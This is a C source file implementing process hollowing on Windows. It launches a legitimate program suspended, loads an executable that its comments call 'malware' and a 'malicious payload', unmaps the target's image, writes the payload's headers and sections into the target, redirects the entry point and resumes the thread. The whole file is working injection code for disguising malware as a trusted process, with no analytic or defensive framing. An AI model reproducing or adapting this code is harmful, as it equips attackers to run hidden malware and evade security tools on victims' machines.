#include <stdio.h>
#include <Windows.h>
#include <stdbool.h>
#include "internals.h"


//int main(int argc, char* argv[]) {
int main() {

	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection) GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
	_NtReadVirtualMemory NtReadVirtualMemory = (_NtReadVirtualMemory) GetProcAddress(hNTDLL, "NtReadVirtualMemory");
	_NtSetContextThread NtSetContextThread = (_NtSetContextThread) GetProcAddress(hNTDLL, "NtSetContextThread");
	_NtResumeThread NtResumeThread = (_NtResumeThread) GetProcAddress(hNTDLL, "NtResumeThread");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(hNTDLL, "NtWriteVirtualMemory");

	
	LPSTARTUPINFOA pStartupinfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();


	if (CreateProcessA(0,(LPSTR)("<file name>"), 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupinfo, processInfo)==0) {
		printf("Error opening Process. Last Error %d\n", GetLastError());
		return 0;
	}


	char pSourceFile[] = "<file nam>";
	HANDLE mProc = CreateFileA(pSourceFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, NULL);
	if (mProc == INVALID_HANDLE_VALUE)
	{
		printf("Error opening File");
		TerminateProcess(processInfo->hProcess, 1);
		return 0;
	}

	// from disk to memory - malware exe
	DWORD nSizeOfFile = GetFileSize(mProc, NULL);
	PVOID image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE); 

	if (image == NULL) {
		printf("virtual allocation for the malware failed. Last Error%d\n", GetLastError());
		TerminateProcess(processInfo->hProcess, 1);
		return 0;
	}

	DWORD read;
	if (!ReadFile(mProc, image, nSizeOfFile, &read, NULL)) {
		printf("unable to read malicious file into memory. Error:%d\n", GetLastError());
		return 0;
	}
	TerminateProcess(mProc, 1);

	// Headers of the malware
	printf("Headers of the malware\n");
	PIMAGE_DOS_HEADER pdh;
	PIMAGE_NT_HEADERS pnh;
	PIMAGE_SECTION_HEADER psh;

	pdh = (PIMAGE_DOS_HEADER)image;
	pnh = (PIMAGE_NT_HEADERS)((LPBYTE)image + pdh->e_lfanew);

	if (pdh->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
	{
		printf("\nError: Invalid executable format.\n");
		TerminateProcess(processInfo->hProcess, 1); // We failed, terminate the child process.
		return 0;
	}

	// Get context from the legit process
	printf("Get context from the legit process\n");
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(processInfo->hThread, &ctx);


	//Get BaseAddress of the target process
	printf("NtReadVirtualMemory call\n");
	PVOID base;

#ifdef _WIN64
	NtReadVirtualMemory(processInfo->hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base,
		sizeof(PVOID), NULL);
#elif _WIN32
	NtReadVirtualMemory(processInfo->hProcess, (PVOID)(ctx.Ebx + 8), &base,
		sizeof(PVOID), NULL);
#endif


	if ((DWORD)base == pnh->OptionalHeader.ImageBase)
	{
		NtUnmapViewOfSection(processInfo->hProcess, base);
	
	}


	//Allocate space in memory for the malicious payload using VirtualAllocEx. 
	// mem = baseAddress of the malware inside the target process memory space.

	PVOID mem = VirtualAllocEx(processInfo->hProcess, (PVOID)pnh->OptionalHeader.ImageBase,
		pnh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


	if (!mem) {
		printf("VirtualAllocEx call failed %d\r\n", GetLastError());
		TerminateProcess(processInfo->hProcess, 1);
		return 0;
	}
	printf("Write Section Headers\n");


	// Write Section Headers
	NtWriteVirtualMemory(processInfo->hProcess, mem, image,
		pnh->OptionalHeader.SizeOfHeaders, NULL);

	// Write Sections
	for (int i = 0; i < pnh->FileHeader.NumberOfSections; i++) {
		psh = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pdh->e_lfanew +
			sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		printf("Writing %s section to processInfo0x%p\r\n", psh->Name, (PVOID)((LPBYTE)mem + psh->VirtualAddress));
		NtWriteVirtualMemory(processInfo->hProcess,
							(PVOID)((LPBYTE)mem + psh -> VirtualAddress),
							(PVOID)((LPBYTE)image + psh -> PointerToRawData), psh->SizeOfRawData, NULL);

	}

	//EAX =  new entry point
#ifdef _WIN64
	ctx.Rcx = (SIZE_T)((LPBYTE)mem + pnh->OptionalHeader.AddressOfEntryPoint);
	NtWriteVirtualMemory(processInfo->hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)),
		&pnh->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

#elif _WIN32
	ctx.Eax = (SIZE_T)((LPBYTE)mem + pnh->OptionalHeader.AddressOfEntryPoint);
	NtWriteVirtualMemory(processInfo->hProcess, (PVOID)(ctx.Ebx + 8),
		&pnh->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

#endif
	

	if (!SetThreadContext(processInfo->hThread, &ctx))
	{
		printf("Error setting context\r\n");
		return 0;
	}
	
	// Change the protection to readonly
	//PDWORD old = 0;
	//VirtualProtectEx(processInfo->hProcess, &pnh->OptionalHeader.ImageBase, pnh->OptionalHeader.SizeOfImage,
	//	PAGE_READONLY, old);
	printf("Resuming thread\r\n");
	if (!ResumeThread(processInfo->hThread)) {
		printf("Error resuming thread\r\n");
		return 0;
	}

	VirtualFree(image, 0, MEM_RELEASE);

	printf("Done\n");
	system("pause");
	return 0;
}